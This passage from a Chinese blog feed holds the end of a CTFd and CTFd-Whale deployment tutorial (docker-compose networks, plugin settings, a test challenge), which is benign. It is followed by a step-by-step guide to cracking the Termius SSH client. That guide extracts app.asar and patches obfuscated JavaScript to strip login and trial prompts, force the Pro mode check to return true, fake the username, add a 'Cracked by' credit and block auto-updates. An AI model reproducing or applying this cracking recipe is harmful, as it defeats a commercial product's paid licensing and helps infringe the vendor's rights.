class="string">glzjin/frp:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./frp:/conf/</span></span><br><span class="line">    <span class="attr">entrypoint:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/usr/local/bin/frps</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/conf/frps.ini</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">host</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">    <span class="attr">internal:</span></span><br><span class="line">        <span class="attr">internal:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">frp:</span></span><br><span class="line">        <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line">        <span class="attr">ipam:</span></span><br><span class="line">            <span class="attr">config:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line">    <span class="attr">frp_containers:</span></span><br><span class="line">        <span class="attr">driver:</span> <span class="string">overlay</span></span><br><span class="line">        <span class="attr">internal:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">ipam:</span></span><br><span class="line">            <span class="attr">config:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.2</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="构建镜像">构建镜像</h2><p>运行 <code>docker-compose build</code>命令，等待</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801213138417.png" alt="image-20210801213138417"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801213415209.png" alt="image-20210801213415209"></p><p>如果修改的各配置文件没有错误的话，那么应该就会返回 <code>Successfully tagged ctfd_ctfd:latest</code>~</p><h2 id="部署容器">部署容器</h2><p>运行 <code>docker-compose up -d</code> 部署容器，耐心等待~</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801213452229.png" alt="image-20210801213452229"></p><p>不出意外的话，等全部显示done就成功啦~</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801213932831.png" alt="image-20210801213932831"></p><p>我们再来使用<code>docker ps -a</code>查看一下当前正在运行的容器是否都正常。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801214012976.png" alt="image-20210801214012976"></p><p>访问你的服务器的公网IP就能打开平台界面啦，由于CTFd最新版启用了nginx端口转发，我们直接访问<code>80</code>端口即可，当然CTFd的默认端口<code>8000</code>也可以访问。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801214109697.png" alt="image-20210801214109697"></p><p>Hint: 对于Docker的两条命令<code>docker-compose build</code> 和 <code>docker-compose up -d</code> ，我们可以将它们合起来写成一句命令 <code>docker-compose up -d --build</code></p><h2 id="后续配置">后续配置</h2><p>进入平台后的账号主题相关配置请自行设置，这里我们主要提一下根据本教程安装的CTFd-Whale的配置（别的教程可能不能保证完全适用）如果你使用的是本人修改集成CTFd-Whale插件的CTFd版本，那么插件设置处只需要修公网IP和HTTP域名即可。</p><p>进入后台CTFd-Whale插件的Frp标签下</p><p>第一处：Http Domain Suffix（HTTP模式域名）</p><p>此处填写的域名为Frp容器的节点域名，并非为CTFd平台的域名，（请先将该节点域名泛解析到本服务器的IP上）</p><p>例如 <code>*.node.vixxxx.com | A | 39.111.11.111</code> ，不同DNS服务商操作或许不一样。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804172313247.png" alt="image-20210804172313247"></p><p>然后在CTFd-Whale插件设置里设置<code>node.vixxxx.com</code>，这里填写的域名不需要填写 <code>*.</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804172754383.png" alt="image-20210804172754383"></p><p>第二处：Direct IP Address（服务器公网IP）</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804173127474.png" alt="image-20210804173127474"></p><p>如果你修改了其他配置，例如CTFd根目录的文件夹名称可能会导致容器名称变化，或是Swarm节点别名，导致无法正常启动靶场，请参照CTFd-Whale完整配置信息表自行修改。</p><p><strong>附：CTFd-Whale完整配置信息表</strong></p><table><thead><tr><th>属性</th><th>参考配置</th><th>备注</th></tr></thead><tbody><tr><td>Docker API URL</td><td>unix:///var/run/docker.sock</td><td>Docker API 链接（保持默认即可）</td></tr><tr><td>Credentials</td><td></td><td>Docker Hub用户名和密码，以“:”分隔。用于拉取私人镜像</td></tr><tr><td>Swarm Nodes</td><td>linux-1</td><td>前面Swarm 集群设置标记的节点别名</td></tr><tr><td>Use SSL</td><td></td><td>高级功能，暂不用管</td></tr><tr><td>Auto Connect Network</td><td>ctfd_frp_containers</td><td>与 frpc 所在容器相连接的网络</td></tr><tr><td>Dns Setting</td><td>114.114.114.114</td><td>靶机内网有DNS可写DNS地址，没有则直接写一个外部DNS</td></tr><tr><td>Auto Connect Containers</td><td>ctfd_frpc_1</td><td>frpc所对应的容器名称</td></tr><tr><td>Multi-Container Network Subnet</td><td>174.1.0.0/16</td><td>内网题大子网IP/CIDR</td></tr><tr><td>Multi-Container Network Subnet New Prefix</td><td>24</td><td>每个内网题实例的GIDR</td></tr><tr><td>API URL</td><td><a href="http://frpc:7400">http://frpc:7400</a></td><td>需要要连接的 Frp API</td></tr><tr><td>Http Domain Suffix</td><td><a href="http://node.vixxxx.com">node.vixxxx.com</a></td><td>已经泛解析的子域名（不用加*)</td></tr><tr><td>Http Port</td><td>8080</td><td>frps http开放的端口</td></tr><tr><td>Direct IP Address</td><td>39.111.11.111</td><td>机器的公网IP</td></tr><tr><td>Direct Minimum Port</td><td>10000</td><td>容器最小的端口值</td></tr><tr><td>Direct Maximum Port</td><td>10100</td><td>容器最大的端口值</td></tr><tr><td>Frpc config template</td><td>[common]<br/>token = randomme<br/>server_addr = 172.1.0.1<br/>server_port = 6490<br/>pool_count = 200<br/>tls_enable = true<br/><br/>admin_addr = 172.1.0.3<br/>admin_port = 7400</td><td>frp目录下frpc.ini文件内容，记得修改token</td></tr><tr><td>Frps config template [generated]</td><td></td><td>自动生成的frps配置模板（不用管）</td></tr><tr><td>Max Container Count</td><td>100</td><td>最多允许容器数量</td></tr><tr><td>Max Renewal Times</td><td>5</td><td>单个容器最多允许续期的次数</td></tr><tr><td>Docker Container Timeout</td><td>3600</td><td>实例存活的时间，单位为秒</td></tr><tr><td>Subdomain Template</td><td>{{ container.uuid }}</td><td>设置生成容器的子域</td></tr><tr><td>Flag Template</td><td>{{"flag{"+uuid.uuid4()\|string+"}"}}</td><td>自定义flag的前缀()</td></tr></tbody></table><p><strong>题目测试</strong></p><p>这里我们使用 ctftraining/qwb_2019_supersqli 进行测试，添加题目后进行访问。</p><p>添加题目过程参考下图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804182508256.png" alt="image-20210804182508256"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804182507256.png" alt="image-20210804182507256"></p><p>HTTP模式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804182638340.png" alt="image-20210804182638340"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804182717320.png" alt="image-20210804182717320"></p><p>Direct模式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804183338739.png" alt="image-20210804183338739"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804183410903.png" alt="image-20210804183410903"></p><p>如果两种模式下都能正常访问容器，那么恭喜你现在CTFd最新版本你已经成功部署啦~</p><h2 id="避坑指南">避坑指南</h2><p>1、安装完Docker，如遇使用 <code>apt update</code> 命令时在 Docker源处更新缓慢</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804180538048.png" alt="image-20210804180538048"></p><p>请删除<code>/etc/apt/sources.list.d/docker.list</code>文件，如果不更新或安装Docker无需此文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf  /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure><p>由于使用的是我改良集成版本的CTFd，目前来看可以一气呵成的的部署成功~</p><p>后面有机会再更新赵师傅的CTFd v2.3.2版的安装教程，这个版本的安装时坑较多，后续更新再写~</p><h2 id="参考文章">参考文章</h2><p><a href="https://www.zhaoj.in/read-6333.html">https://www.zhaoj.in/read-6333.html</a></p><p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/index.html">https://hujiekang.top/2020/04/26/CTFd-conf/index.html</a></p><p><a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><p>转载请务必注明来源：<a href="https://ollyhsu.github.io/posts/ctfd/">https://ollyhsu.github.io/posts/ctfd/</a></p><p>如果有问题，请在<a href="https://ollyhsu.github.io/posts/ctfd/">个人Hexo博客</a> 文章下面的评论区留言或私信联系我，不足之处敬请谅解！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> CTFd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> CTFd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Termius破解版修改方法</title>
      <link href="/posts/termius/"/>
      <url>/posts/termius/</url>
      
        <content type="html"><![CDATA[<h2 id="准备工作">准备工作</h2><p>先使用npm安装asar模块</p><p>安装命令：npm install -g asar</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519152117604.png" alt="image-20210519152117604"></p><p>然后打开程序位置下的resources文件夹，将下面的app.asar反编译出来，如果没有提示任何信息就结束则已经好了。</p><p>反编译命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar extract app.asar ./app</span><br></pre></td></tr></table></figure><p>asar用法提示：</p><p>解压<code>app.asar</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">asar e app.asar &lt;解压后的目录&gt;</span><br><span class="line">asar extract app.asar &lt;解压后的目录&gt;</span><br></pre></td></tr></table></figure><p>打包<code>app.asar</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">asar p &lt;被打包的目录&gt; app.asar</span><br><span class="line">asar pack &lt;被打包的目录&gt; app.asar</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519152325569.png" alt="image-20210519152325569"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519152401985.png" alt="image-20210519152401985"></p><h2 id="正式修改">正式修改</h2><div class="snote info"><p>本文代码针对Windows 版7.11.3，由于原作者对软件进行了混淆加密，不同版本参考思路进行修改即可。</p></div><h3 id="首次欢迎界面">首次欢迎界面</h3><p>原样式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519153450211.png" alt="image-20210519153450211"></p><p>Hint：由于程序经过代码混淆，请参考下面原值找到正确的位置进行修改</p><p>位置：<code>app\js\ui-process.js</code></p><p>定位值：<code>openLoginScreen:A&#125;)))))&#125;&#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519153059224.png" alt="image-20210519153059224"></p><p>搜索定位到此方法的代码出，利用括号匹配提示找到整个方法的代码</p><p>参考值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">pv</span> <span class="keyword">extends</span> <span class="title class_ inherited__">De.Component</span>&#123;<span class="title function_">componentDidMount</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">mounted</span>&amp;&amp;<span class="variable language_">this</span>.<span class="property">props</span>.<span class="title function_">onMountWelcome</span>()&#125;<span class="title function_">render</span>(<span class="params"></span>)&#123;<span class="keyword">const</span>&#123;<span class="attr">openLoginScreen</span>:A,<span class="attr">onOk</span>:e,<span class="attr">opacityWelcome</span>:t,<span class="attr">translateYWelcome</span>:r,<span class="attr">opacityContainer</span>:n,<span class="attr">closeContainer</span>:i,<span class="attr">onClose</span>:s,<span class="attr">classes</span>:o,<span class="attr">endMount</span>:a,<span class="attr">mounted</span>:B,<span class="attr">handleTransitionEnd</span>:c,<span class="attr">setRef</span>:g,<span class="attr">setFadeOutRef</span>:l&#125;=<span class="variable language_">this</span>.<span class="property">props</span>;<span class="keyword">return</span> me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:<span class="title function_">jr</span>()(&#123;<span class="string">&quot;termius-dark-theme&quot;</span>:!<span class="number">0</span>,[o.<span class="property">container</span>]:!<span class="number">0</span>,[o.<span class="property">transitionContainer</span>]:!<span class="number">0</span>,[o[n?<span class="string">&quot;opacityOn&quot;</span>:<span class="string">&quot;opacityOff&quot;</span>]]:!<span class="number">0</span>&#125;),<span class="attr">onTransitionEnd</span>:c,<span class="attr">ref</span>:g&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:<span class="title function_">jr</span>()(&#123;[o.<span class="property">loginBtnContainer</span>]:!<span class="number">0</span>,[o[B?<span class="string">&quot;transition&quot;</span>:<span class="string">&quot;transitionElement2&quot;</span>]]:!<span class="number">0</span>,[o[t?<span class="string">&quot;opacityOn&quot;</span>:<span class="string">&quot;opacityOff&quot;</span>]]:!<span class="number">0</span>,[o[r?<span class="string">&quot;translateYOff&quot;</span>:<span class="string">&quot;translateYOn&quot;</span>]]:!<span class="number">0</span>&#125;)&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="title class_">Ug</span>,&#123;<span class="attr">onClick</span>:<span class="function">()=&gt;</span>&#123;<span class="title function_">A</span>()&#125;&#125;,<span class="string">&quot;Log In&quot;</span>)),me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:<span class="title function_">jr</span>()(&#123;[o.<span class="property">description</span>]:!<span class="number">0</span>,[o[B?<span class="string">&quot;transition&quot;</span>:<span class="string">&quot;transitionElement&quot;</span>]]:!<span class="number">0</span>,[o[t?<span class="string">&quot;opacityOn&quot;</span>:<span class="string">&quot;opacityOff&quot;</span>]]:!<span class="number">0</span>,[o[r?<span class="string">&quot;translateYOff&quot;</span>:<span class="string">&quot;translateYOn&quot;</span>]]:!<span class="number">0</span>&#125;)&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(fv,<span class="literal">null</span>)),me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:<span class="title function_">jr</span>()(&#123;[o.<span class="property">row</span>]:!<span class="number">0</span>,[o[B?<span class="string">&quot;transition&quot;</span>:<span class="string">&quot;transitionElement3&quot;</span>]]:!<span class="number">0</span>,[o[t?<span class="string">&quot;opacityOn&quot;</span>:<span class="string">&quot;opacityOff&quot;</span>]]:!<span class="number">0</span>,[o[r?<span class="string">&quot;translateYOff&quot;</span>:<span class="string">&quot;translateYOn&quot;</span>]]:!<span class="number">0</span>&#125;),<span class="attr">onTransitionEnd</span>:a,<span class="attr">ref</span>:l&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:o.<span class="property">pictureContainer</span>&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>,&#123;<span class="attr">className</span>:o.<span class="property">image</span>,<span class="attr">src</span>:<span class="title class_">Mv</span>,<span class="attr">alt</span>:<span class="string">&quot;welcome&quot;</span>&#125;),me.<span class="property">a</span>.<span class="title function_">createElement</span>(vv,<span class="literal">null</span>)),me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:o.<span class="property">formGroup</span>&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(av,&#123;<span class="attr">onOk</span>:e,<span class="attr">onClose</span>:s,<span class="attr">closeContainer</span>:i,<span class="attr">openLoginScreen</span>:A&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(hv,&#123;<span class="attr">closeContainer</span>:i,<span class="attr">openLoginScreen</span>:A&#125;)))))&#125;&#125;</span><br></pre></td></tr></table></figure><p>修改值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">pv</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>此时再打开程序时，提示界面已经没有了</p><h3 id="Preferences中的Account">Preferences中的Account</h3><p>原样式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519153653768.png" alt="image-20210519153653768"></p><p>位置：<code>app\js\ui-process.js</code></p><p>原值：<code>[],&#123;title:&quot;Account&quot;&#125;,&#123;title:&quot;Terminal&quot;&#125;</code></p><p>修改值：<code>[],&#123;title:&quot;Terminal&quot;&#125;</code></p><p>方法：使用修改值替换原值</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519153805293.png" alt="image-20210519153805293"></p><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519153852726.png" alt="image-20210519153852726"></p><h3 id="左上方菜单栏中的Account">左上方菜单栏中的Account</h3><p>原样式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519153953762.png" alt="image-20210519153953762"></p><p>位置：<code>app\js\ui-process.js</code></p><p>原值：<code>[],&quot;Account&quot;,&quot;Terminal&quot;,&quot;Shortcuts&quot;</code></p><p>修改值：<code>[],&quot;Terminal&quot;,&quot;Shortcuts&quot;</code></p><p>方法：使用修改值替换原值</p><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519154203394.png" alt="image-20210519154203394"></p><h3 id="左上方菜单栏中的Login">左上方菜单栏中的Login</h3><p>定位值：<code>()&#125;&#125;,&quot;Login&quot;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519154318561.png" alt="image-20210519154318561"></p><p>位置：<code>app\js\ui-process.js</code></p><p>参考值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!o&amp;&amp;me.<span class="property">a</span>.<span class="title function_">createElement</span>(hm,&#123;<span class="attr">className</span>:n.<span class="property">item</span>,<span class="attr">dense</span>:!<span class="number">0</span>,<span class="attr">onClick</span>:<span class="function">()=&gt;</span>&#123;<span class="variable language_">this</span>.<span class="title function_">login</span>(),<span class="title function_">e</span>()&#125;&#125;,<span class="string">&quot;Login&quot;</span>),</span><br></pre></td></tr></table></figure><p>方法：根据<code>定位值</code>找到此方法的代码，类似参考值，然后删除即可</p><p>提示：注意最有有个逗号也要一起删除，代码由于混淆了，不要直接搜索参考值</p><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519154832524.png" alt="image-20210519154832524"></p><h3 id="菜单栏Try">菜单栏Try</h3><p>原样式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519155109641.png" alt="image-20210519155109641"></p><p>位置：<code>app\js\ui-process.js</code></p><p>定位值：<code>&#125;,&quot;Create Account&quot;)));</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519163502066.png" alt="image-20210519163502066"></p><p>参考值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,M=me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:i.<span class="property">promoContainer</span>&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:i.<span class="property">tryPremiumContainer</span>&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="variable constant_">EQ</span>,&#123;<span class="attr">color</span>:<span class="string">&quot;primary&quot;</span>,<span class="attr">fontSize</span>:<span class="number">12</span>,<span class="attr">bold</span>:!<span class="number">0</span>&#125;,<span class="string">&quot;Try Premium for Free&quot;</span>),me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>,&#123;<span class="attr">className</span>:i.<span class="property">infoText</span>&#125;,<span class="string">&quot;SFTP, Secure Sync, Snippets&quot;</span>),me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="title class_">Ug</span>,&#123;<span class="attr">className</span>:i.<span class="property">createAccountButton</span>,<span class="attr">onClick</span>:C,<span class="attr">size</span>:<span class="string">&quot;xs&quot;</span>,<span class="attr">fullWidth</span>:!<span class="number">0</span>&#125;,<span class="string">&quot;Create Account&quot;</span>)))</span><br></pre></td></tr></table></figure><p>方法：找到类似上方代码删除，最前面的逗号要删去，)))后的分号要保留。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519163717297.png" alt="image-20210519163717297"></p><p>Hint：修改后仍然显示“Sentry Logger”，这里我们可以先不用管它。</p><h3 id="左下角Try">左下角Try</h3><p>原样式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519163004444.png" alt="image-20210519163004444"></p><p>位置：<code>app\js\ui-process.js</code></p><p>定位值：<code>&#125;)?null:a&#125;;</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519155228893.png" alt="image-20210519155228893"></p><p>参考值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">m0</span>=(<span class="params">&#123;isCompactMode:A&#125;</span>)=&gt;&#123;<span class="keyword">const</span> e=<span class="title class_">Kn</span>(<span class="title class_">Ea</span>),t=<span class="title class_">Kn</span>(vO),r=<span class="title class_">On</span>(),n=<span class="title class_">Object</span>(<span class="title class_">De</span>.<span class="property">useCallback</span>)(<span class="function">()=&gt;</span>&#123;<span class="title function_">r</span>(<span class="title function_">IF</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>())),<span class="title function_">r</span>(<span class="title function_">TB</span>(&#123;<span class="attr">promotionLocation</span>:<span class="string">&quot;Sidebar&quot;</span>,<span class="attr">promotionType</span>:<span class="string">&quot;Trial&quot;</span>,<span class="attr">trialDaysLeft</span>:<span class="keyword">void</span> <span class="number">0</span>&#125;))&#125;,[r]),i=<span class="title class_">Object</span>(<span class="title class_">De</span>.<span class="property">useCallback</span>)(<span class="title function_">async</span>()=&gt;&#123;<span class="keyword">try</span>&#123;<span class="title function_">r</span>(<span class="title function_">RB</span>(&#123;<span class="attr">promotionLocation</span>:<span class="string">&quot;Sidebar&quot;</span>,<span class="attr">promotionType</span>:<span class="string">&quot;Trial&quot;</span>,<span class="attr">trialDaysLeft</span>:<span class="keyword">void</span> <span class="number">0</span>&#125;)),<span class="title class_">Eh</span>.<span class="title function_">userJustSawSuggestionToTryPremium</span>();<span class="keyword">const</span> A=<span class="keyword">await</span> <span class="title function_">M0</span>();<span class="title function_">r</span>(<span class="title function_">nB</span>(&#123;<span class="title class_">Source</span>:<span class="string">&quot;TryPremium&quot;</span>,<span class="title class_">Email</span>:A&#125;)),<span class="keyword">await</span> <span class="title function_">iF</span>(),<span class="keyword">await</span> <span class="title class_">Db</span>()&#125;<span class="keyword">catch</span>(A)&#123;&#125;&#125;,[r]),s=<span class="title class_">Object</span>(<span class="title class_">De</span>.<span class="property">useCallback</span>)(<span class="function">()=&gt;</span>me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="variable constant_">I0</span>,<span class="literal">null</span>),[]),o=<span class="title class_">Object</span>(<span class="title class_">De</span>.<span class="property">useCallback</span>)(<span class="function">()=&gt;</span>me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="variable constant_">EQ</span>,&#123;<span class="attr">whiteSpace</span>:<span class="string">&quot;nowrap&quot;</span>,<span class="attr">color</span>:<span class="string">&quot;success&quot;</span>,<span class="attr">fontSize</span>:<span class="number">10</span>,<span class="attr">underline</span>:!<span class="number">0</span>&#125;,me.<span class="property">a</span>.<span class="title function_">createElement</span>(<span class="title class_">Ug</span>,&#123;<span class="attr">base</span>:!<span class="number">0</span>,<span class="attr">color</span>:<span class="string">&quot;inherit&quot;</span>,<span class="attr">onClick</span>:i&#125;,<span class="string">&quot;Learn about the free trial&quot;</span>)),[i]),a=<span class="title class_">Object</span>(<span class="title class_">De</span>.<span class="property">useMemo</span>)(<span class="function">()=&gt;</span>me.<span class="property">a</span>.<span class="title function_">createElement</span>(bQ,&#123;<span class="attr">handleClose</span>:n,<span class="title class_">IconComponent</span>:s,<span class="title class_">LinkComponent</span>:o,<span class="attr">isCompactMode</span>:A,<span class="attr">description</span>:<span class="string">&quot;Try Premium for Free&quot;</span>&#125;),[s,o,n,A]);<span class="keyword">return</span> <span class="title class_">Object</span>(<span class="title class_">De</span>.<span class="property">useEffect</span>)(<span class="function">()=&gt;</span>&#123;<span class="title function_">D0</span>(&#123;<span class="attr">username</span>:e,<span class="attr">freeToTrialDismissTimestamp</span>:t&#125;)||<span class="title function_">r</span>(<span class="title function_">LB</span>(&#123;<span class="attr">promotionLocation</span>:<span class="string">&quot;Sidebar&quot;</span>,<span class="attr">promotionType</span>:<span class="string">&quot;Trial&quot;</span>,<span class="attr">trialDaysLeft</span>:<span class="keyword">void</span> <span class="number">0</span>&#125;))&#125;,[e]),<span class="title function_">D0</span>(&#123;<span class="attr">username</span>:e,<span class="attr">freeToTrialDismissTimestamp</span>:t&#125;)?<span class="attr">null</span>:a&#125;;</span><br></pre></td></tr></table></figure><p>修改值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">m0</span>=(<span class="params">&#123;isCompactMode:A&#125;</span>)=&gt;&#123;<span class="keyword">return</span> <span class="literal">null</span>&#125;;</span><br></pre></td></tr></table></figure><p>方法：将方法返回为null，参考上方代码</p><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519163252589.png" alt="image-20210519163252589"></p><h3 id="开启专业模式">开启专业模式</h3><p>原样式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519164722945.png" alt="image-20210519164722945"></p><p>位置：<code>app\js\ui-process.js</code></p><p>原值1：<code>return A.user.account.pro_mode</code></p><p>修改值1：<code>return true</code></p><p>原值2：<code>return A.user.username</code></p><p>修改值2：<code>return 'FreeUser'</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519155950442.png" alt="image-20210519155950442"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519164859497.png" alt="image-20210519164859497"></p><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519164928210.png" alt="image-20210519164928210"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519165106493.png" alt="image-20210519165106493"></p><p>Hint：这里需要替换修改两处内容，开启专业模式后上面的Sentry longer就没了。</p><h3 id="关于信息">关于信息</h3><p>位置：<code>app\js\main-process.js</code></p><p>原值：<code>Version $&#123;this.options.version&#125;\n\nTermius Corporation</code></p><p>修改值：<code>Version $&#123;this.options.version&#125;\nTermius Corporation\nCracked by Oliver</code></p><p>Hint：为了显示破解信息故作者在关于增加此信息</p><h3 id="打开开发者工具">打开开发者工具</h3><p>位置：<code>app\js\main-process.js</code></p><p>原值：<code>this.browserWindow.loadURL(e.url)</code></p><p>修改值：<code>this.browserWindow.webContents.openDevTools()</code></p><h3 id="屏蔽自动更新">屏蔽自动更新</h3><p>1、删除 <code>resources/app-update.yml</code></p><p>2、去除菜单栏里的检查更新</p><p>原样式：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519170118572.png" alt="image-20210519170118572"></p><p>位置：<code>app\js\main-process.js</code></p><p>定位值：<code>)&#125;,visible:</code></p><p>这边定位会出现两处代码，可以看一下第一个位置，它不显示是怎么写的，如图这便混淆后要想不显示则设置的是<code>gu()</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519165729354.png" 